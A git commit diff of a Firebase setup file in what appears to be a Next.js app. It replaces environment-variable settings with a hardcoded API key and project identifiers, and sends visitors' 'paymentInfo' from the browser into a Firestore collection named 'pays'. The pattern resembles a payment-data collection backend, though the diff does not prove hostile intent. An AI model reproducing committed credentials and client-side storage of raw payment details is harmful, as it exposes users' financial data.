f2c7b5df2fd253f4d0ac4e88da8edc36c93d4d6f
SXDC <clieantapp@gmail.com>
2025-08-22 15:15:09 +0000

    ssssssssssssssssss

--- lib/firebase.ts
+++ lib/firebase.ts
@@ -1,50 +1,49 @@
 // firebase.js
-import { getApp, getApps, initializeApp } from 'firebase/app';
-import { getDatabase } from 'firebase/database';
-import { doc, getFirestore, setDoc } from 'firebase/firestore';
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { doc, getFirestore, setDoc } from "firebase/firestore";
 
 const firebaseConfig = {
-  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY!,
-  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN!,
-  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL!,
-  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID!,
-  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET!,
-  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID!,
-  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID!,
-  measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID!,
+  apiKey: "AIzaSyDBMqcU7j_xGlTFJ0chMjaSIjLqdD4UJac",
+  authDomain: "zainmfs-f5e34.firebaseapp.com",
+  projectId: "zainmfs-f5e34",
+  storageBucket: "zainmfs-f5e34.firebasestorage.app",
+  messagingSenderId: "995287662716",
+  appId: "1:995287662716:web:0dbefc4280f5260d3dc9f9",
+  measurementId: "G-GB2N8XSSF8",
 };
 
-const app =  initializeApp(firebaseConfig);
+const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const database = getDatabase(app);
 
 export async function addData(data: any) {
-  localStorage.setItem('visitor', data.id);
+  localStorage.setItem("visitor", data.id);
   try {
-    const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef, data,{merge:true});
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(docRef, data, { merge: true });
 
-    console.log('Document written with ID: ', docRef.id);
+    console.log("Document written with ID: ", docRef.id);
     // You might want to show a success message to the user here
   } catch (e) {
-    console.error('Error adding document: ', e);
+    console.error("Error adding document: ", e);
     // You might want to show an error message to the user here
   }
 }
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const docRef = doc(db, 'pays', visitorId);
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...paymentInfo,createdDate:new Date().toISOString() },
+        { ...paymentInfo, createdDate: new Date().toISOString() },
         { merge: true }
       );
     }
   } catch (error) {
-    console.error('Error adding document: ', error);
-    alert('Error adding payment info to Firestore');
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
-export { db,database };
+export { db, database };
